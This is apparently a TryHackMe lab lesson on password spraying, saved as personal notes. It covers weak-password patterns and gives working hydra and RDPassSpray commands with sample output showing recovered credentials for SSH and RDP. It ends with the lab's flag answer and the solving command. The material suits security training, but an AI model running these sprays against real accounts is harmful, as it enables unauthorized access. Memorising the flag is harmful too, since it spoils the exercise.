This task will teach the fundamentals of a password spraying attack and the tools needed to perform various attack scenarios against common online services.

Password Spraying is an effective technique used to identify valid credentials. Nowadays, password spraying is considered one of the common password attacks for discovering weak passwords. This technique can be used against various online services and authentication systems, such as SSH, SMB, RDP, SMTP, Outlook Web Application, etc. A brute-force attack targets a specific username to try many weak and predictable passwords. While a password spraying attack targets many usernames using one common weak password, which could help avoid an account lockout policy. The following figure explains the concept of password spraying attacks where the attacker utilizes one common password against multiple users.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/17bdbbc66c5924d99823be70e98832ed.png)  

Common weak and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format can be found below.

-   The current season followed by the current year (SeasonYear). For example, **Fall2020**, **Spring2021**, etc.
-   The current month followed by the current year (MonthYear). For example, **November2020**, **March2021**, etc.
-   Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.  
    

If a password complexity policy is enforced within the organization, we may need to create a password that includes symbols to fulfill the requirement, such as October2021!, Spring2021!, October2021@, etc. **To be successful in the password spraying attack, we need to enumerate the target and create a list of valid usernames (or email addresses list)**.

Next, we will apply the password spraying technique using different scenarios against various services, including:

-   SSH
-   RDP
-   Outlook web access (OWA) portal  
    
-   SMB

### SSH

Assume that we have already enumerated the system and created a valid username list.

Hashcat

```shell-session
user@THM:~# cat usernames-list.txt
admin
victim
dummy
adm
sammy
```

Here we can use hydra to perform the password spraying attack against the SSH service using the Spring2021 password.

Hashcat

```shell-session
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.

### RDP

Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to password spray against RDP. First, install the tool on your attacking machine by following the installation instructions in the tool’s Github repo. As a new user of this tool, we will start by executing the python3 RDPassSpray.py -h command to see how the tools can be used:

Hashcat

```shell-session
user@THM:~# python3 RDPassSpray.py -h
usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Target machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts
```

Now, let's try using the (-u) option to specify the victim as a username and the (-p) option set the Spring2021!. The (-t) option is to select a single host to attack.

Hashcat

```shell-session
user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
```

The above output shows that we successfully found valid credentials victim:Spring2021!. Note that we can specify a domain name using the -d option if we are in an Active Directory environment.

Hashcat

```shell-session
user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

There are various tools that perform a spraying password attack against different services, such as:

### Outlook web access (OWA) portal  

Tools:

-   [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) (atomizer.py)
-   [MailSniper](https://github.com/dafthack/MailSniper)

### SMB

-   Tool: Metasploit (auxiliary/scanner/smb/smb_login)

Answer the questions below

Use the following username list:

Password spraying attack!

```shell-session
user@THM:~# cat usernames-list.txt 
admin
phillips
burgess
pittman
guess
```

Perform a password spraying attack to get access to the SSH://MACHINE_IP server to read /etc/flag. **What is the flag?**

	THM{a97a26e86d09388bbea148f4b870277d}

```
hydra -L usernames-list.txt -p Fall2021@ ssh://10.10.244.213
```

![[Pasted image 20220412202918.png]]

![[Pasted image 20220412203005.png]]